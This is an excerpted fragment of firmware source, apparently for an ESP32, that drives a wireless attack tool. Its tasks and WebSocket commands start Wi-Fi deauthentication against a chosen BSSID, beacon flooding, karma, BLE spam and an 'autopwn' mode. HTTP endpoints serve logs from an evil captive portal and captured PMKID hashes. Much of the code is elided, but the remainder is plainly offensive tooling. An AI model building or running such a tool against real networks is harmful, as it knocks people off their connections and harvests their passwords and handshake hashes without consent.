...
void wifiAttackTask(void*) {
  ...
  unsigned long lastDeauth=0, lastBeacon=0;
  while(1) {
    ...
    if (attack.karma && attack.karmaSsid != "") {
...
void webServerTask(void*) {
  ws.onEvent([](AsyncWebSocket*,AsyncWebSocketClient*,AwsEventType type,void*,uint8_t* data,size_t len){
    ...
    deserializeJson(wsJsonDoc, data, len);
    String cmd = wsJsonDoc["cmd"];
    portENTER_CRITICAL(&attackMux);

    if (cmd=="start_deauth") {
      attack.deauth = true;
      sscanf(wsJsonDoc["bssid"]|"", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
      ...
      attack.deauth_ch = wsJsonDoc["ch"]|1;
    } else if (cmd=="stop_deauth") attack.deauth=false;
    else if (cmd=="start_beacon") { attack.beacon=true; attack.beaconCount=wsJsonDoc["count"]|50; }
      ...
      attack.bleSpam = true;
      attack.bleVariant = wsJsonDoc["v"]| -1;
      ...
      String newPass = wsJsonDoc["password"].as<String>();
      if (newPass.length() >= 8) {
        apPassword = newPass;
        WiFi.softAP(AP_SSID, apPassword.c_str());
        File f = LittleFS.open(CONFIG_FILE, "w");
        if (f) { serializeJson(wsJsonDoc, f); f.close(); }
      }
    }
  ...
  server.on("/api/portal", HTTP_GET, [](AsyncWebServerRequest* r){
    flushPortalLog();
    if (LittleFS.exists(PORTAL_LOG)) r->send(LittleFS, PORTAL_LOG, "text/plain");
    else r->send(200, "text/plain", "");
  });
  server.on("/api/pmkid", HTTP_GET, [](AsyncWebServerRequest* r){
    flushPMKIDFile();
    if (LittleFS.exists(PMKID_FILE)) r->send(LittleFS, PMKID_FILE, "text/plain");
    else r->send(200, "text/plain", "");
  });
  ...
  while(1) {
    ...
    if (n>0) {
      scanJsonDoc.clear();
      JsonArray nets = scanJsonDoc.createNestedArray("networks");
      for (int i=0; i<n && i<40; i++) {
        ...
        net["enc"] = (WiFi.encryptionType(i)==WIFI_AUTH_OPEN)?"Open":(WiFi.encryptionType(i)==WIFI_AUTH_WPA2_PSK)?"WPA2":"WPA";
      }
      String out; serializeJson(scanJsonDoc, out);
      ws.textAll(out);
      WiFi.scanDelete();
    }
    statJsonDoc.clear();
    statJsonDoc["deauth"]=attack.deauth; statJsonDoc["beacon"]=attack.beacon;
    statJsonDoc["ble"]=attack.bleSpam; statJsonDoc["autopwn"]=attack.autoPwn;
    statJsonDoc["portal"]=attack.evilPortalActive; statJsonDoc["pmkidCnt"]=attack.capturedHashes;
    String s; serializeJson(statJsonDoc, s);
    ws.textAll(s);
    vTaskDelay(2000);
  }
}
...
void promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type==WIFI_PKT_MGMT) {
    ...
    clientJsonDoc.clear();
    JsonArray arr = clientJsonDoc.createNestedArray("clients");
    ...
    String s; serializeJson(clientJsonDoc, s);
    ws.textAll(s);
  }
}
